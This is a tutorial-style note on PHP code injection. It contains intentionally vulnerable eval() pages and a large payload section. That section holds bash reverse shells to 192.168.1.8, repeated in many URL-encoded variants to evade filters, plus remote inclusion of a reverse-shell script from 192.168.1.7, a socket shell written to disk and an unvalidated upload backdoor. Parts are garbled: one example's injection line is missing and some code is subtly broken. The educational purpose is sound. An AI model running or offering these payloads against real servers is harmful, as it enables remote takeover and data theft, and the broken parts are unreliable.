# Code-Injection

## Code Injection

**Code Injection** is a cyberattack whereby an attacker inserts malicious code into an application that is then executed.  
This exploits poor handling of untrusted data due to lack of proper input/output validation, allowing attackers to alter application behavior, steal data, or take control of systems.

---

## What is Code Injection?

Code Injection attacks exploit vulnerabilities where user input is not properly **sanitized or validated**.  
The attacker injects malicious code in the application's programming language (e.g., PHP, SQL), and the application executes it, enabling unauthorized actions.  

Unlike command injection, where the attack leverages shell commands, code injection is only limited by the features of the injected language itself.

---

## Examples of Code Injection

### Example 1
In PHP, an application that uses a GET parameter directly in an `include()` function without validation can be exploited:

    http://testsite.com/index.php?page=contact.php


An attacker might inject code via:


This executes the attacker's remote PHP script.

---

### Example 2
Using PHP's `eval()` function unsafely by passing unfiltered user input:

    $myvar = "varname";
$x = $_GET['arg'];
eval("$myvar = $x;");

- An attacker can execute malicious code like:

      /index.php?arg=1; phpinfo()

## Types of Code Injection

- SQL Injection: Injecting malicious SQL queries to manipulate databases.

- Command Injection: Injecting system commands to be executed on the server.

- Cross-Site Scripting (XSS): Injecting malicious scripts into webpages viewed by other users.

- LDAP Injection: Manipulating LDAP queries for unauthorized access.

- XML Injection: Altering XML data or queries to change application behavior.

## How Code Injection Affects Organizations

- Impacts include:

- Data theft (credentials, payment info, sensitive data)

- Unauthorized system access and privilege escalation

- Service disruption and downtime

- Financial loss and reputational damage

## Detection Mechanisms

- Static Analysis: Scanning source code for unsafe coding practices before deployment.

- Dynamic Analysis: Testing running applications using simulated attacks.

- Runtime Protection: Real-time monitoring and blocking suspicious execution patterns.

- Input Validation: Strictly validating all user inputs against expected formats.

## Prevention Best Practices

- Input Sanitization: Filter and clean input to block dangerous characters.

- Parameterized Queries: Separate data from code logic in database queries to prevent SQL injection.

- Output Encoding: Encode user output to prevent execution of injected scripts (esp. for XSS).

- Content Security Policy (CSP): Browser-level policy to restrict unauthorized script execution.

- Use secure coding principles (e.g., avoid eval() and unsafe functions).

- Employ Web Application Firewalls (WAFs) for additional protection.

## Summary

Code Injection is a severe security threat exploiting improper input validation to execute dangerous code.
Awareness of attack types, rigorous coding practices, layered detection, and prevention measures are essential to defend against these attacks effectively.

- code-injection.php
      
      <!DOCTYPE html>
      <html>
      <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Code Injection</title>
      </head>
      <body>
      
      <pre>
      <?php
        $fun = $_REQUEST['fun'];
        echo $fun . "<br>";
        eval($fun . ";");
      ?>
      </pre>
      
      </body>
      </html>
      
## Description
   
    http://192.168.1.5/php/code-injection.php?fun=sleep(10)
    http://192.168.1.5/php/code-injection.php?fun=phpinfo()

This PHP script takes a parameter fun from the user request (via GET, POST, or COOKIE), outputs it verbatim to the page, and then executes it as PHP code using the unsafe eval() function.

- The line $fun = $_REQUEST['fun']; assigns the user-controlled input to the $fun variable.

- echo $fun "<brr>"; prints the raw input back to the browser without any modification or sanitization.

- The critical vulnerability lies in eval($fun . ";"); which executes the content of $fun directly as PHP code.

 > This creates a code injection vulnerability, because any PHP code supplied by an attacker in the fun parameter will be executed on the server. This can lead to arbitrary command execution, data theft, modification, or full system compromise.

The use of eval() on unsanitized user input is highly dangerous. While this code demonstrates how simple it can be to inject code, it is a critical security risk and should be avoided in real-world applications.

> This example serves educational purposes to highlight the risks and consequences of unsafe code execution through eval(), emphasizing the need for strict input validation, sanitization, and avoidance of such constructs in production code.

--------------

The critical vulnerability lies in eval($fun.";"), which executes the content of $fun directly as PHP code.

This creates a code injection vulnerability, because any PHP code supplied by an attacker in the fun parameter will be executed on the server. This can lead to arbitrary command execution, data theft, modification, or full system compromise.

The use of eval() on unsanitized user input is highly dangerous. While this code demonstrates how simple it can be to inject code, it is a critical security risk and should be avoided in real-world applications.

- This example serves educational purposes to highlight the risks and consequences of unsafe code execution through eval(), emphasizing the need for strict input validation, sanitization, and avoidance of such constructs in production code.
- Reverse Shell Commands=

      exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.8/443 0>&1'")
    
      exec("/bin/bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/192.168.1.8/443%200%3E%261'")
      
      exec("/bin/bash%20-c%20bash%20-i%20%3E%26%20/dev/tcp/192.168.1.8/443%200%3E%261'")
      
      exec("%22%2Fbin%2Fbash%20-c%20'bash%20-i%20%3E%26%20/dev%2Ftcp%2F192.168.1.8%2F443%200%3E%261%27%22")
      
      exec("%657%2Fbin%2Fbash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.8%2F443%200%3E%261%27%22%29")
  
      
      passthru("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.8/443 0>&1'")
      
      passthru("/bin/bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/192.168.1.8/443%200%3E%261'")
      
      passthru("/bin/bash%20-c%20bash%20-i%20%3E%26%20/dev/tcp/192.168.1.8/443%200%3E%261'")
      
      passthru("%22%2Fbin%2Fbash%20-c%20'bash%20-i%20%3E%26%20/dev%2Ftcp%2F192.168.1.8%2F443%200%3E%261%27%22")
      
      passthru("%657%2Fbin%2Fbash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.8%2F443%200%3E%261%27%22%29")
  
      
      system("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.8/443 0>&1'")
      
      system("/bin/bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/192.168.1.8/443%200%3E%261'")
      
      system("/bin/bash%20-c%20bash%20-i%20%3E%26%20/dev/tcp/192.168.1.8/443%200%3E%261'")
      
      system("%22%2Fbin%2Fbash%20-c%20'bash%20-i%20%3E%26%20/dev%2Ftcp%2F192.168.1.8%2F443%200%3E%261%27%22")
      
      system("%657%2Fbin%2Fbash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.8%2F443%200%3E%261%27%22%29")
  
      
      shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.8/443 0>&1'")
      
      shell_exec("/bin/bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/192.168.1.8/443%200%3E%261'")
      
      shell_exec("/bin/bash%20-c%20bash%20-i%20%3E%26%20/dev/tcp/192.168.1.8/443%200%3E%261'")
      
      shell_exec("%22%2Fbin%2Fbash%20-c%20'bash%20-i%20%3E%26%20/dev%2Ftcp%2F192.168.1.8%2F443%200%3E%261%27%22")
      
      shell_exec("%657%2Fbin%2Fbash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.8%2F443%200%3E%261%27%22%29")
  
      
      ping -c 4 127.0.0.1
      
      ping%20-c%204%20127.0.0.1
  
      
      /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.8/443 0>&1'
      
      %2Fbin%2Fbash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.8%2F443%200%3E%261%27
  
  
      
      popen("id", "r");
      popen("ping -c 4 127.0.0.1", "r");
      popen("ping -c 40 127.0.0.1", "r");

 -  Code-injection-3.php
        
        <!DOCTYPE html>
        <html>
        <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Code Injection</title>
        </head>
        <body>
        
        <form action="code-injection-3.php" method="POST">
            Function:<input type="text" name="fun"><br />
            <input type="submit" name="run" value="run">
        </form>
        
        <pre>
        <?php
            if (isset($_POST['fun'])) {
                $fun = $_POST['fun'];
        
                if (!preg_match('/exec|system|shell_exec/', $fun)) {
                    eval($fun.";");
                } else {
                    echo "Error";
                }
            }
        ?>
        </pre>
        
        </body>
        </html>


# payloads
## escapeshellcmd
### Description:
Sanitizes a command string to escape characters that could be used for shell command injection.

- Use:
Helps mitigate command injection risk when running shell commands with functions such as exec() or shell_exec().

- Risk:
Alone, it may not fully prevent injection if input is not strictly validated or if the original command logic is unsafe.

## include / require

Description:
PHP statements to include and execute external PHP files.

Risks:

- If used with untrusted input, an attacker can perform Local File Inclusion (LFI) or Remote File Inclusion (RFI).

- This could allow code execution from attacker-controlled files or sensitive system files (/etc/passwd).

Examples:

Attempts to include system password file as PHP code, causing an error or leakage:

        php
        include('/etc/passwd')
        require('/etc/passwd')
Includes remote malicious PHP code from attacker server (RFI):
        
        php
        include('http://192.168.1.7/php-reverse-shell.php')
        require('http://192.168.1.7/php-reverse-shell.php')


## file_put_contents

### Description:
Writes data to a file, creating or overwriting the file.


### Risk:
Can be used by attackers to write malicious PHP scripts to the server, enabling backdoors or other exploits.

### Example:

    php
    $code = '<?php phpinfo(); ?>';
    file_put_contents("phpinfo-test.php", $code);
    Creates a file that when accessed shows detailed PHP configuration information.

## file_get_contents

### Description:
Reads the contents of files or URLs into a string.

### Risk:
If user-controlled, can be misused to read sensitive files or remote URLs, causing information disclosure or code inclusion.

### Example:

    php
    $content = file_get_contents("/etc/passwd");
    echo nl2br(htmlspecialchars($content));
    Reads and safely outputs system password file content.

## eval

### Description:
Evaluates a string containing PHP code during runtime.

### Risks:

Critical security threat if applied on unsanitized user input, leading to Remote Code Execution (RCE).

Enables entire-arbitrary PHP code execution.

### Example:

    php
    $code = 'echo "Hello, World!";';
    eval($code);
    Executes dynamic PHP code.

## Reverse Shell Payload Example

### Description:
PHP code that opens a TCP connection back to an attacker's system, then spawns a /bin/sh shell over the socket.

### Implications:
Allows attacker to remotely execute commands on the compromised server.

### Example:

    php
    $ip = '192.168.1.7';
    $port = 443;
    $code = '<?php set_time_limit(0); $sock = fsockopen($ip, $port); $proc = proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>';
    file_put_contents("reverse-shell.php", $code);
    

## File Upload Script Embedded via File Write
### Description:
Writes an HTML form and PHP code for uploading files to a new file (upload2.php).

### Risk:
Allows arbitrary file upload with no validation, enabling attackers to upload and execute malicious scripts or overwrite files.

### Example snippet:

    php
    $file = fopen("upload2.php","w");
    fwrite($file, '<html><form action="upload2.php" method="post" enctype="multipart/form-data"> Select File to upload:
    <input type="file" name="fileToUpload" id="fileToUpload"> <input type="submit" value="Upload" name="submit"></form></html>
    <?php if(isset($_POST["submit"])) { $file_name = $_FILES["fileToUpload"]["name"];
    $file_tmp_name = $_FILES["fileToUpload"]["tmp_name"];
    if (move_uploaded_file($file_tmp_name, "./" . $file_name)) { echo "ok"; } } ?>');
    fclose($file);

     Summary                                                       Table
    
    Payload =                                                     / Function	Description and Risk
    
    escapeshellcmd	=                                            Sanitizes shell commands to help prevent injection, but partial.
    
     include, require	=                                        Includes PHP files; risk of RFI/LFI if input untrusted.
    
     file_put_contents	 =                                       Writes data to files; risk of backdoor creation.
    
     file_get_contents	 =                                       Reads file/URL contents; info disclosure or remote code fetch.
    
     eval	   =                                                 Executes arbitrary PHP code; critical RCE vector.
    
     include('/etc/passwd')	 =                                   Attempts local file inclusion; generally fails but shows info.
    
     include('http://192.168.1.7/php-reverse-shell.php') =       Remote file inclusion; executes attacker's code remotely.
    
     require('/etc/passwd')	 =                                   Same as include; includes local sensitive file.
    
     require('http://192.168.1.7/php-reverse-shell.php')=	    Remote file inclusion for code execution.
    
    Writing PHP files with file_put_contents	=                Deploys new PHP scripts on server for info disclosure or control.
    
     Reverse shell PHP code written via file_put_contents  =  	Opens a remote shell for attacker control.
    
     Reading /etc/passwd with file_get_contents   =              Reads sensitive system info file.
    
    Executing code dynamically with eval	=                    Executes arbitrary PHP code strings.
    
    Writing file upload handler to file      =                  	Enables file uploads without validation, risk of malware upload.
    

These payloads reflect common methods attackers use to achieve Remote Code Execution, file inclusion, information disclosure, and unauthorized control in vulnerable PHP applications.

Exercise extreme caution and follow security best practices to avoid these risks.
